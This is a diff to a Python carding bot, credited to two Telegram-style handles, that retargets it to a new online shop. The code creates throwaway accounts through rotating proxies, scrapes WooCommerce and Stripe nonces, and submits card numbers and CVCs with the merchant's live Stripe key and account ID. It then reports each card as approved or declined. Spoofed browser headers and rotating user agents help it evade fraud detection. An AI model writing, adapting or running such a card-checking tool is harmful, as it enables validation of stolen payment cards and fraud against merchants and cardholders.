@@ -399,13 +399,13 @@ def create_new_account_with_retry(session, proxy_str, max_retries=3):
         try:
             proxies = parse_proxy(proxy_str)
             
-            # Step 1: Get login nonce
-            login_page_res = session.get('https://orevaa.com/my-account/', proxies=proxies, timeout=15)  # Reduced timeout
+            # Step 1: Get login nonce - UPDATED URL
+            login_page_res = session.get('https://theherocollectibles.com/my-account/', proxies=proxies, timeout=15)
             
             login_nonce_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', login_page_res.text)
             if not login_nonce_match:
                 if attempt < max_retries - 1:
-                    time.sleep(1)  # Reduced sleep
+                    time.sleep(1)
                     continue
                 return False, "Failed to get login nonce"
             login_nonce = login_nonce_match.group(1)
@@ -420,7 +420,7 @@ def create_new_account_with_retry(session, proxy_str, max_retries=3):
                 'register': 'Register',
             }
             
-            reg_response = session.post('https://orevaa.com/my-account/', data=register_data, proxies=proxies, timeout=15, allow_redirects=False)  # Reduced timeout
+            reg_response = session.post('https://theherocollectibles.com/my-account/', data=register_data, proxies=proxies, timeout=15, allow_redirects=False)
             
             # Check if registration was successful
             if reg_response.status_code in [302, 303]:
@@ -431,7 +431,7 @@ def create_new_account_with_retry(session, proxy_str, max_retries=3):
         except Exception as e:
             if attempt < max_retries - 1:
                 print(f"Account creation attempt {attempt + 1} failed, retrying...")
-                time.sleep(1)  # Reduced sleep
+                time.sleep(1)
                 continue
             return False, f"Account error: {str(e)}"
 
@@ -441,11 +441,21 @@ def get_payment_nonce_with_retry(session, proxy_str, max_retries=3):
         try:
             proxies = parse_proxy(proxy_str)
             
-            payment_page_res = session.get('https://orevaa.com/my-account/add-payment-method/', proxies=proxies, timeout=15)  # Reduced timeout
-            payment_nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', payment_page_res.text)
+            # UPDATED URL for payment methods page
+            payment_page_res = session.get('https://theherocollectibles.com/my-account/add-payment-method/', proxies=proxies, timeout=15)
+            
+            # Look for the nonce in the updated site
+            payment_nonce_match = re.search(r'"create_setup_intent_nonce":"(.*?)"', payment_page_res.text)
+            if not payment_nonce_match:
+                # Alternative pattern for nonce
+                payment_nonce_match = re.search(r'name="_wpnonce" value="(.*?)"', payment_page_res.text)
+            if not payment_nonce_match:
+                # Another alternative pattern
+                payment_nonce_match = re.search(r'"nonce":"(.*?)"', payment_page_res.text)
+            
             if not payment_nonce_match:
                 if attempt < max_retries - 1:
-                    time.sleep(1)  # Reduced sleep
+                    time.sleep(1)
                     continue
                 return None, "Failed to get payment nonce"
             
@@ -454,7 +464,7 @@ def get_payment_nonce_with_retry(session, proxy_str, max_retries=3):
         except Exception as e:
             if attempt < max_retries - 1:
                 print(f"Payment nonce attempt {attempt + 1} failed, retrying...")
-                time.sleep(1)  # Reduced sleep
+                time.sleep(1)
                 continue
             return None, f"Payment nonce error: {str(e)}"
 
@@ -462,12 +472,12 @@ def stripe_api_call_with_retry(url, headers, data, proxies, max_retries=3):
     """Stripe API call with retry logic"""
     for attempt in range(max_retries):
         try:
-            response = requests.post(url, headers=headers, data=data, proxies=proxies, timeout=15)  # Reduced timeout
+            response = requests.post(url, headers=headers, data=data, proxies=proxies, timeout=15)
             return response
         except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
             if attempt < max_retries - 1:
                 print(f"Stripe API attempt {attempt + 1} failed, retrying...")
-                time.sleep(1)  # Reduced sleep
+                time.sleep(1)
                 continue
             raise e
 
@@ -503,7 +513,7 @@ def get_3ds_challenge_mandated(website_response, proxy_str):
                     'one_click_authn_device_support[spc_eligible]': 'true',
                     'one_click_authn_device_support[webauthn_eligible]': 'true',
                     'one_click_authn_device_support[publickey_credentials_get_allowed]': 'true',
-                    'key': 'pk_live_51BNw73H4BTbwSDwzFi2lqrLHFGR4NinUOc10n7csSG6wMZttO9YZCYmGRwqeHY8U27wJi1ucOx7uWWb3Juswn69l00HjGsBwaO',
+                    'key': 'pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs',
                     '_stripe_version': '2024-06-20'
                 }
                 
@@ -565,7 +575,7 @@ def get_final_message(website_response, proxy_str):
 def check_card_stripe(cc_line):
     """Main function to check card via Stripe (single card) with retry logic"""
     start_time = time.time()
-    max_retries = 2  # Reduced retries for speed
+    max_retries = 2
     
     for retry_count in range(max_retries):
         try:
@@ -574,7 +584,7 @@ def check_card_stripe(cc_line):
             if not yy.startswith('20'):
                 yy = '20' + yy
             
-            # FAST BIN LOOKUP FIRST (optimized for speed)
+            # FAST BIN LOOKUP FIRST
             print("🎯 FAST BIN lookup...")
             bin_start_time = time.time()
             bin_info = get_bin_info_reliable(n[:6])
@@ -621,11 +631,11 @@ DECLINED CC ❌
                 yy_stripe = yy
 
             # Create a NEW account for this card with retry
-            account_created, account_msg = create_new_account_with_retry(session, proxy_str, max_retries=2)  # Reduced retries
+            account_created, account_msg = create_new_account_with_retry(session, proxy_str, max_retries=2)
             if not account_created:
                 if retry_count < max_retries - 1:
                     print(f"Account creation failed, retry {retry_count + 1}/{max_retries}")
-                    time.sleep(1)  # Reduced sleep
+                    time.sleep(1)
                     continue
                 elapsed_time = time.time() - start_time
                 return f"""
@@ -644,11 +654,11 @@ DECLINED CC ❌
 """
 
             # Get payment nonce with retry
-            ajax_nonce, nonce_msg = get_payment_nonce_with_retry(session, proxy_str, max_retries=2)  # Reduced retries
+            ajax_nonce, nonce_msg = get_payment_nonce_with_retry(session, proxy_str, max_retries=2)
             if not ajax_nonce:
                 if retry_count < max_retries - 1:
                     print(f"Payment nonce failed, retry {retry_count + 1}/{max_retries}")
-                    time.sleep(1)  # Reduced sleep
+                    time.sleep(1)
                     continue
                 elapsed_time = time.time() - start_time
                 return f"""
@@ -666,8 +676,9 @@ DECLINED CC ❌
 🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
 """
 
-            # Prepare Stripe data with the current card
-            data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy_stripe}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=IN&pasted_fields=number&payment_user_agent=stripe.js%2Ffb4c8a3a98%3B+stripe-js-v3%2Ffb4c8a3a98%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Forevaa.com&time_on_page=293254&client_attribution_metadata[client_session_id]=dd158add-28af-4b7c-935c-a60ace5af345&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=15bdff4a-ba92-40aa-94e4-f0e376053c81&guid=6238c6c1-7a1e-4595-98af-359c1e147853c2bbaa&muid=2c200dbe-43a4-4a5f-a742-4d870099146696a4b8&sid=a8893943-0bc5-4610-8232-e0f68a4ec4cc0e40de&key=pk_live_51BNw73H4BTbwSDwzFi2lqrLHFGR4NinUOc10n7csSG6wMZttO9YZCYmGRwqeHY8U27wJi1ucOx7uWWb3Juswn69l00HjGsBwaO&_stripe_version=2024-06-20'
+            # Prepare Stripe data with the current card - UPDATED FOR NEW SITE
+            random_email = generate_random_email()
+            data = f'billing_details[name]=+&billing_details[email]={random_email}&billing_details[address][country]=US&type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy_stripe}&card[exp_month]={mm}&allow_redisplay=unspecified&pasted_fields=number&payment_user_agent=stripe.js%2F5127fc55bb%3B+stripe-js-v3%2F5127fc55bb%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Ftheherocollectibles.com&time_on_page=34392&client_attribution_metadata[client_session_id]=eafda33e-15cf-4a7d-9f3d-32e5bde9d84b&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=d420325e-88cf-4dbc-8fac-4ba00b62f4ed&guid=cd0785d1-0e53-4100-9ee5-3f253703d5f56d85bb&muid=7e6e0f10-4bbf-4288-9208-318c3d2def606f15a0&sid=392890ab-7a6d-4b8c-adca-8b6569ee273d48b742&key=pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs&_stripe_account=acct_1LwpPBCLeHcAhGxV'
 
             proxies = parse_proxy(proxy_str)
             
@@ -680,15 +691,15 @@ DECLINED CC ❌
             if 'id' in response_data:
                 pm_id = response_data['id']
                 
-                # Second request (admin ajax)
+                # Second request (admin ajax) - UPDATED FOR NEW SITE
                 headers2 = {
                     'accept': '*/*',
-                    'accept-language': 'en-US,en;q=0.6',
-                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                    'origin': 'https://orevaa.com',
+                    'accept-language': 'en-US,en;q=0.8',
+                    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryhD1yXO8InzWb2660',
+                    'origin': 'https://theherocollectibles.com',
                     'priority': 'u=1, i',
-                    'referer': 'https://orevaa.com/my-account/add-payment-method/',
-                    'sec-ch-ua': '"Brave";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
+                    'referer': 'https://theherocollectibles.com/my-account/add-payment-method/',
+                    'sec-ch-ua': '"Chromium";v="142", "Brave";v="142", "Not_A Brand";v="99"',
                     'sec-ch-ua-mobile': '?0',
                     'sec-ch-ua-platform': '"Windows"',
                     'sec-fetch-dest': 'empty',
@@ -696,17 +707,27 @@ DECLINED CC ❌
                     'sec-fetch-site': 'same-origin',
                     'sec-gpc': '1',
                     'user-agent': get_rotating_user_agent(),
-                    'x-requested-with': 'XMLHttpRequest',
                 }
 
-                data2 = {
-                    'action': 'wc_stripe_create_and_confirm_setup_intent',
-                    'wc-stripe-payment-method': pm_id,
-                    'wc-stripe-payment-type': 'card',
-                    '_ajax_nonce': ajax_nonce,
-                }
+                # Prepare multipart form data
+                boundary = "----WebKitFormBoundaryhD1yXO8InzWb2660"
+                data2 = f"""--{boundary}
+Content-Disposition: form-data; name="action"
 
-                response2 = session.post('https://orevaa.com/wp-admin/admin-ajax.php', headers=headers2, data=data2, proxies=proxies, timeout=15)  # Reduced timeout
+create_setup_intent
+--{boundary}
+Content-Disposition: form-data; name="wcpay-payment-method"
+
+{pm_id}
+--{boundary}
+Content-Disposition: form-data; name="_ajax_nonce"
+
+{ajax_nonce}
+--{boundary}--"""
+
+                headers2['content-type'] = f'multipart/form-data; boundary={boundary}'
+                
+                response2 = session.post('https://theherocollectibles.com/wp-admin/admin-ajax.php', headers=headers2, data=data2, proxies=proxies, timeout=15)
                 website_response = response2.json()
                 
                 # Get final message with 3DS info
@@ -805,7 +826,7 @@ DECLINED CC ❌
             else:
                 if retry_count < max_retries - 1:
                     print(f"Stripe validation failed, retry {retry_count + 1}/{max_retries}")
-                    time.sleep(1)  # Reduced sleep
+                    time.sleep(1)
                     continue
                 elapsed_time = time.time() - start_time
                 return f"""
@@ -826,7 +847,7 @@ DECLINED CC ❌
         except Exception as e:
             if retry_count < max_retries - 1:
                 print(f"Request failed with error: {str(e)}, retry {retry_count + 1}/{max_retries}")
-                time.sleep(1)  # Reduced sleep
+                time.sleep(1)
                 continue
             elapsed_time = time.time() - start_time
             # Get BIN info even for errors to ensure we have it
@@ -852,7 +873,7 @@ def check_cards_stripe(cc_lines):
     for cc_line in cc_lines:
         result = check_card_stripe(cc_line)
         results.append(result)
-        time.sleep(1)  # Reduced delay between checks
+        time.sleep(1)
     return results
 
 # For standalone testing
